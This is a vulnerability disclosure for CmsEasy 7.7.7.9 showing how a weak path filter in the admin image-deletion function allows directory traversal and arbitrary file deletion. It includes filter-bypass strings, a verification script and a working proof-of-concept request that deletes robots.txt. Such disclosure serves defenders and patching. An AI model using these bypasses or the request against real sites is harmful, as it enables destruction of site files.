# CmsEasy Directory Traversal Leading to Arbitrary File Deletion Vulnerability

------

**Note: This vulnerability requires backend privileges**

------



# Vendor Information

**Developer:** 四平市九州易通科技有限公司 Siping Jiuzhou Yitong Technology Co., Ltd.

**Product Information:** CmsEasy V7.7.7.9 20240105

**Official Website:** https://www.cmseasy.cn/

**Product Source Code Download Address:** https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.7_UTF-8_20240105.zip



# Trigger Points

**Note: This vulnerability requires backend privileges**

Located in: `lib/admin/file_admin.php` within the function `deleteimg_action`. **Note: In this project, `front::get` is equivalent to `$_GET`.**

**Objective:** To trigger the `if (!unlink($img))` statement.

```php
function deleteimg_action() {
        if (!front::get('dir') || !front::get('imgname'))
            return;
        $img = ROOT  .config::get('html_prefix').'/'. '/upload/images/' . front::get('dir') . '/' . str_replace('___', '.', front::get('imgname'));
        $img = str_replace('.php', '', $img);
        $img = str_replace('#', '', $img);
        $img = str_replace('../', '', $img);
        $img = str_replace('./', '', $img);

        if (!file_exists($img))
            front::flash(lang_admin('picture').lang_admin('nonentity'));
        if (!unlink($img))   // --------触发位置----------------         front::flash(lang_admin('delete').lang_admin('failure').'，'.lang_admin('please_check_permissions'));
        else
            front::flash(lang_admin('picture').lang_admin('ondelete'));
        front::redirect(url::modify('act/listimg/dir/' . front::get('dir')));
    }
```



# Vulnerability Analysis



## Bypassing the Filtering

The function includes protection measures, but its filtering is not strict enough, allowing for bypass.

Note: `config::get('html_prefix')` is a fixed value `cn`, which enables directory traversal via controlling the `dir` parameter.

```php
        $img = ROOT  .config::get('html_prefix').'/'. '/upload/images/' . front::get('dir') . '/' . str_replace('___', '.', front::get('imgname'));
        $img = str_replace('.php', '', $img);
        $img = str_replace('#', '', $img);
        $img = str_replace('../', '', $img);
        $img = str_replace('./', '', $img);
```

**Bypass Methods: Two Approaches**

**Method One:** Use conventional path parsing combined with rewriting

```php
.....///.....///
=>result in
../../
```

**Method Two:** Leverage Windows path parsing characteristics:

```
..\\ or ..\
```

Similarly, if you want to traverse PHP files, you only need to construct `.p.phphp`.

**Code Verification:**

```php
<?php
function check_url($tpl){
   $tpl = str_replace('.php', '', $tpl);
    $tpl = str_replace('#', '', $tpl);
    $tpl = str_replace('../', '', $tpl);
    $tpl = str_replace('./', '', $tpl);
    return $tpl;
}
$str1 = '.p.phphp';
$str2 = '.....///.....///';  

$path1 = check_url($str1);
$path2 = check_url($str2);

echo 'path1:  ' . $path1 . "\n";  // path:  .php
echo 'path2:  ' . $path2 . "\n"; // path1:  ../../
```

## Request Construction

After testing, we can conclude the following:

Request analysis:

```http
http://127.0.0.1:5678/index.php?case=database&act=backAll&admin_dir=admin&site=default
```

- The `case` parameter corresponds to the business logic file located under the `lib/admin` directory (in this example, it is `database_admin.php`).
- The `act` parameter corresponds to the `xxxx_action` function within the file pointed to by `case` (in this example, it is the `backAll_action()` method).
- The `admin_dir` parameter is the backend directory parameter (this vulnerability requires backend privileges).
- The `site` parameter is the default parameter if not configured (it has no impact).

Thus, we can construct the request as follows, where `{xxxx}` represents the injection points for `dir` and `imgname`:

```htt[
http://127.0.0.1:5678/index.php?case=file&act=deleteimg&admin_dir=admin&site=default&dir={xxxx}&imgname={XXXX}
```



## POC Construction and Verification

According to the explanation of the function earlier:

```php
$img = ROOT  .config::get('html_prefix').'/'. '/upload/images/' . front::get('dir') . '/' . str_replace('___', '.', front::get('imgname'));
```

This results in appending `dir` and `imgname` to the directory `/cn/upload/images/`.

![image-20250202183849224](/assest/cmseasy/vul-2-2-1/1.png)

Among them, the directories `202012` and `201908` are fixed template static resources. (According to FoFa testing, most targets have image files under the `202012` directory, for example, the external mapping of the sample image resource is `/images/banner/s1.jpg`).

We attempt to delete `robots.txt` (located in the root directory).

![image-20250202183943448](/assest/cmseasy/vul-2-2-1/2.png)



**Construct Request Message:**

```http
GET /index.php?case=file&act=deleteimg&admin_dir=admin&site=default&dir=202012&imgname=.....///.....///.....///.....///robots.txt HTTP/1.1
Host: 192.168.107.1:5678
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=kedh3tpmobjfgci55hvqskpfq6; login_username=admin; login_password=UcaU5eNfvRIM4QKU5SNaASI45RKg6egPvR7A%253DSNhregCK2ab18391e6e61e99aff8e10d05e4ad02
referer: http://192.168.107.1:5678/index.php?case=admin&act=login&admin_dir=admin&site=default
Connection: keep-alive
```

A response of `302` is considered normal.

![image-20250202184035246](/assest/cmseasy/vul-2-2-1/3.png)

Checking the `robots.txt` file, it was found to have been successfully deleted.

![image-20250202184111275](/assest/cmseasy/vul-2-2-1/4.png)

Vulnerability verification successful.







































